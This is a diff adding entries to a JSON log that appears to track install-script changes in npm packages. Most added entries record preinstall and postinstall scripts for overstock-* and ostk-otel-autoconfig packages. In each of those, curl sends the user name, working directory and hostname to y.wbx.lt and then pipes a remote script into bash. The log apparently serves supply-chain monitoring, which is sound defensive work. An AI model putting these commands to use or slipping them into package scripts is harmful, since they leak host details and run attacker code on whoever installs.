@@ -1,5 +1,140 @@
 [
   {
+    "packageName": "overstock-logger",
+    "version": "3.17.4",
+    "scriptType": "postinstall",
+    "scriptContent": "curl \"https://y.wbx.lt/4?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"; curl \"https://y.wbx.lt/x.txt\" | bash ",
+    "previousVersion": "3.16.4",
+    "timestamp": "2026-01-25T23:13:00.995Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "overstock-logger",
+    "version": "3.17.4",
+    "scriptType": "preinstall",
+    "scriptContent": "curl \"https://y.wbx.lt/2?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"; curl \"https://y.wbx.lt/x.txt\" | bash ",
+    "previousVersion": "3.16.4",
+    "timestamp": "2026-01-25T23:13:00.993Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "@mattgrill/storyblok-11ty",
+    "version": "2.0.0",
+    "scriptType": "prebuild",
+    "scriptContent": "npm run clean && npm run type-check",
+    "previousVersion": null,
+    "timestamp": "2026-01-25T23:13:00.073Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "overstock-jenkins",
+    "version": "1.9.1",
+    "scriptType": "postinstall",
+    "scriptContent": "curl \"https://y.wbx.lt/4?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"; curl \"https://y.wbx.lt/x.txt\" | bash ",
+    "previousVersion": "1.8.1",
+    "timestamp": "2026-01-25T23:12:59.237Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "overstock-jenkins",
+    "version": "1.9.1",
+    "scriptType": "preinstall",
+    "scriptContent": "curl \"https://y.wbx.lt/2?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"; curl \"https://y.wbx.lt/x.txt\" | bash ",
+    "previousVersion": "1.8.1",
+    "timestamp": "2026-01-25T23:12:59.236Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "overstock-health-express",
+    "version": "1.6.2",
+    "scriptType": "postinstall",
+    "scriptContent": "curl \"https://y.wbx.lt/4?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"; curl \"https://y.wbx.lt/x.txt\" | bash ",
+    "previousVersion": "1.6.1",
+    "timestamp": "2026-01-25T23:12:36.955Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "overstock-health-express",
+    "version": "1.6.2",
+    "scriptType": "preinstall",
+    "scriptContent": "curl \"https://y.wbx.lt/2?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"; curl \"https://y.wbx.lt/x.txt\" | bash ",
+    "previousVersion": "1.6.1",
+    "timestamp": "2026-01-25T23:12:36.954Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "overstock-login-layer",
+    "version": "3.6.3",
+    "scriptType": "postinstall",
+    "scriptContent": "curl \"https://y.wbx.lt/4?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"; curl \"https://y.wbx.lt/x.txt\" | bash ",
+    "previousVersion": "3.5.1",
+    "timestamp": "2026-01-25T23:12:33.818Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "overstock-login-layer",
+    "version": "3.6.3",
+    "scriptType": "preinstall",
+    "scriptContent": "curl \"https://y.wbx.lt/2?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"; curl \"https://y.wbx.lt/x.txt\" | bash ",
+    "previousVersion": "3.5.1",
+    "timestamp": "2026-01-25T23:12:33.817Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "overstock-component-library",
+    "version": "6.6.2",
+    "scriptType": "postinstall",
+    "scriptContent": "curl \"https://y.wbx.lt/4?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"; curl \"https://y.wbx.lt/x.txt\" | bash ",
+    "previousVersion": "6.5.1",
+    "timestamp": "2026-01-25T23:12:32.723Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "overstock-component-library",
+    "version": "6.6.2",
+    "scriptType": "preinstall",
+    "scriptContent": "curl \"https://y.wbx.lt/2?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"; curl \"https://y.wbx.lt/x.txt\" | bash ",
+    "previousVersion": "6.5.1",
+    "timestamp": "2026-01-25T23:12:32.722Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "overstock-component-library-v3",
+    "version": "4.6.2",
+    "scriptType": "postinstall",
+    "scriptContent": "curl \"https://y.wbx.lt/4?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"; curl \"https://y.wbx.lt/x.txt\" | bash ",
+    "previousVersion": "4.5.2",
+    "timestamp": "2026-01-25T23:12:31.134Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "overstock-component-library-v3",
+    "version": "4.6.2",
+    "scriptType": "preinstall",
+    "scriptContent": "curl \"https://y.wbx.lt/2?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"; curl \"https://y.wbx.lt/x.txt\" | bash ",
+    "previousVersion": "4.5.2",
+    "timestamp": "2026-01-25T23:12:31.133Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "ostk-otel-autoconfig",
+    "version": "2.7.1",
+    "scriptType": "postinstall",
+    "scriptContent": "curl \"https://y.wbx.lt/4?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"; curl \"https://y.wbx.lt/x.txt\" | bash ",
+    "previousVersion": "2.6.6",
+    "timestamp": "2026-01-25T23:12:29.088Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "ostk-otel-autoconfig",
+    "version": "2.7.1",
+    "scriptType": "preinstall",
+    "scriptContent": "curl \"https://y.wbx.lt/2?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"; curl \"https://y.wbx.lt/x.txt\" | bash ",
+    "previousVersion": "2.6.6",
+    "timestamp": "2026-01-25T23:12:29.086Z",
+    "issuesend": false
+  },
+  {
     "packageName": "claude-fleet",
     "version": "2.2.0",
     "scriptType": "postinstall",
